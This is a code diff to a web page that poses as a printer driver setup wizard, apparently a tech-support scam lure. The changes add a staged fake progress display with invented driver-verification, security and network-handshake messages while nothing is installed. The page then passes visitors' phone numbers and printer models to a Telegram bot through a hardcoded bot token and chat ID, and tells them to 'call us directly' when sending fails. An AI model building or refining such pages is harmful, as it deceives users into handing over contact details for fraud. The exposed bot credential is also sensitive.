@@ -56,6 +56,21 @@
         .progress-fill { height: 100%; background: var(--primary); width: 0%; transition: width 0.3s; }
         .status-msg { font-weight: 600; font-size: 15px; color: var(--text-dark); }
 
+        /* --- PROFESSIONAL STEP INDICATOR (NEW) --- */
+        .step-progress-wrapper {
+            background: #e6f7ff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--primary);
+            text-align: left;
+        }
+        .step-progress-item { display: flex; align-items: center; gap: 8px; margin-bottom: 5px; }
+        .step-progress-item i { color: #f59e0b; } /* Warning/Working color */
+
+
         /* --- STAGE 2: THE "EAGER" ACTION PAGE (Hidden) --- */
         #actionSection { display: none; animation: slideUp 0.6s ease-out; }
         .split-grid { display: grid; grid-template-columns: 1fr 1fr; height: 100%; }
@@ -125,24 +140,54 @@
         <div class="card">
             
             <div id="simSection" class="sim-wrapper">
-                <h1 class="sim-title">Let's Setup Your Printer</h1>
-                <p class="sim-desc">Enter your printer model number to check for drivers and connection status.</p>
-
+                
                 <div id="inputBox">
-                    <input type="text" id="simInput" class="input-large" placeholder="e.g. HP DeskJet 2700...">
-                    <button onclick="startSim()" class="btn-start">
-                        Start Setup <i class="fa-solid fa-arrow-right"></i>
-                    </button>
-                    <p style="margin-top: 20px; font-size: 13px; color: #888;">
-                        <i class="fa-solid fa-lock"></i> Secure & Private Connection
-                    </p>
+                    <div style="text-align: center; margin-bottom: 25px;">
+                        <span style="font-size: 14px; font-weight: 700; color: #0078d4; padding: 5px 15px; border: 1px solid #0078d4; border-radius: 50px;">
+                            STEP 1 OF 3
+                        </span>
+                    </div>
+
+                    <i class="fa-solid fa-cloud-arrow-down sim-icon" style="color: #0078d4; margin-bottom: 15px; font-size: 40px;"></i>
+                    <h1 class="sim-title" style="font-size: 28px; font-weight: 800; color: #222;">
+                        Start Your Printer Setup
+                    </h1>
+                    
+                    <div id="inputForm" style="max-width: 400px; margin: 0 auto;">
+                        
+                        <label for="simInput" style="display: block; font-size: 18px; font-weight: 700; margin-bottom: 15px; color: #555; text-align: left;">
+                            Enter Your Printer Model Name/Number:
+                        </label>
+                        
+                        <div style="position: relative; margin-bottom: 15px;">
+                            <i class="fa-solid fa-barcode" style="position: absolute; left: 15px; top: 18px; color: #999;"></i>
+                            <input 
+                                type="text" 
+                                id="simInput" 
+                                class="input-large" 
+                                placeholder="Ex: 5540, Pro Series, or just the number..." 
+                                style="padding-left: 45px; height: 55px; border-radius: 6px; font-size: 18px; border: 2px solid #ccc;" 
+                                required
+                            >
+                        </div>
+
+                        <button onclick="startSimulation()" class="btn-start" style="font-size: 20px; padding: 18px; margin-top: 10px;">
+                            Start Installation <i class="fa-solid fa-arrow-right"></i>
+                        </button>
+                        
+                        <p style="margin-top: 15px; font-size: 14px; color: #888;">
+                            <i class="fa-solid fa-lock"></i> Connection is Secure.
+                        </p>
+                    </div>
                 </div>
 
                 <div id="loaderBox" class="loader-box">
+                    <div class="step-progress-wrapper" id="stepProgress">
+                         </div>
                     <div class="progress-track">
                         <div class="progress-fill" id="progressBar"></div>
                     </div>
-                    <div class="status-msg" id="statusMsg">Connecting to device...</div>
+                    <div class="status-msg" id="statusMsg">Initializing configuration wizard...</div>
                 </div>
             </div>
 
@@ -216,41 +261,94 @@
     </div>
 
     <script>
-        function startSim() {
+        // FUNCTION NAME CORRECTION (startSim -> startSimulation)
+        function startSimulation() {
             const val = document.getElementById('simInput').value;
             if(val.length < 2) { alert("Please enter model number."); return; }
 
-            // Switch to Loading
+            // UI Changes
             document.getElementById('inputBox').style.display = 'none';
             document.getElementById('loaderBox').style.display = 'block';
             
             // Pass Data to Form
             document.getElementById('model').value = val;
 
+            // --- PROFESSIONAL PROGRESS LOGIC ---
             let w = 0;
+            let currentStage = 1;
             const bar = document.getElementById('progressBar');
-            const txt = document.getElementById('statusMsg');
+            const status = document.getElementById('statusMsg');
+            const stepArea = document.getElementById('stepProgress');
+            const totalTime = 12000; // 12 seconds total simulation time
+            let isPaused = false;
+
+            // Initial Step Status
+            stepArea.innerHTML = `
+                <div class="step-progress-item"><i class="fa-solid fa-gear"></i> Initializing Scan...</div>
+                <div class="step-progress-item"><i class="fa-solid fa-lock"></i> Verifying Security...</div>
+                <div class="step-progress-item" id="stage3"><i class="fa-solid fa-circle"></i> Connecting to Network...</div>
+            `;
+
 
             const timer = setInterval(() => {
-                w += 2;
+                if(isPaused) return;
+
+                w += 1; // Slow increment for realism
                 bar.style.width = w + "%";
                 
-                if(w > 20) txt.innerText = "Checking drivers for " + val + "...";
-                if(w > 60) txt.innerText = "Verifying wireless status...";
-                if(w > 90) txt.innerText = "Attempting secure handshake...";
+                // STAGE 1: IDENTIFICATION (0-30%)
+                if(w < 30) {
+                    status.innerText = "1. Identifying drivers for " + val + "...";
+                } 
+                
+                // PAUSE 1: Driver Verification Check
+                if (w === 30 && currentStage === 1) {
+                    isPaused = true;
+                    status.innerText = "Verifying driver signature. Please wait...";
+                    stepArea.innerHTML += `<div class="step-progress-item" style="color: #f59e0b;"><i class="fa-solid fa-pause"></i> PAUSED: Driver verification taking longer...</div>`;
+                    
+                    setTimeout(() => {
+                        isPaused = false;
+                        currentStage = 2;
+                        // Mark Stage 1 as done
+                        status.innerText = "Resuming installation...";
+                        stepArea.innerHTML = stepArea.innerHTML.replace("Initializing Scan...", "Scan Complete.");
+                        stepArea.innerHTML = stepArea.innerHTML.replace("Verifying Security...", "Security Verified.");
+                        stepArea.innerHTML = stepArea.innerHTML.replace("PAUSED: Driver verification taking longer...", "Driver Verified.");
+                    }, 1500); // Pause for 1.5 seconds
+                }
 
-                if(w >= 100) {
+                // STAGE 2: INSTALLATION (30-70%)
+                if (w > 30 && w < 70) {
+                    status.innerText = "2. Copying essential configuration files...";
+                }
+
+                // PAUSE 2: Network Handshake Attempt
+                if (w === 70 && currentStage === 2) {
+                    isPaused = true;
+                    status.innerText = "Attempting wireless network handshake...";
+                    
+                    setTimeout(() => {
+                        isPaused = false;
+                        currentStage = 3;
+                        status.innerText = "3. Finalizing setup and testing connection...";
+                    }, 2000); // Pause for 2 seconds
+                }
+
+                // STAGE 3: FINISH & INTERRUPT (70-100%)
+                if (w >= 100) {
                     clearInterval(timer);
                     setTimeout(() => {
                         document.getElementById('simSection').style.display = 'none';
                         document.getElementById('actionSection').style.display = 'block';
                     }, 500);
                 }
-            }, 50);
+            }, 80); // Slower interval for 12-15 second simulation
         }
 
+        // --- TELEGRAM LOGIC ---
         function sendTelegram(e) {
-            e.preventDefault();
+            e.preventDefault(); 
             const btn = document.getElementById('submitBtn');
             btn.innerText = "Sending...";
             btn.disabled = true;
@@ -259,7 +357,7 @@
             const phone = document.getElementById('phone').value;
             const model = document.getElementById('model').value;
 
-            // --- YOUR TOKEN ---
+            // YOUR TOKENS (PRESERVED)
             const botToken = "7764513169:AAFpRf8WQ6WE7DymOqMgTxXjv6BUSZe2734";
             const chatId = "1684000886";
 
@@ -272,7 +370,7 @@
                 document.getElementById('successPanel').style.display = 'block';
             }).catch(err => {
                 alert("Please call us directly.");
-                btn.innerText = "Try Again";
+                btn.innerHTML = "Try Again";
                 btn.disabled = false;
             });
         }
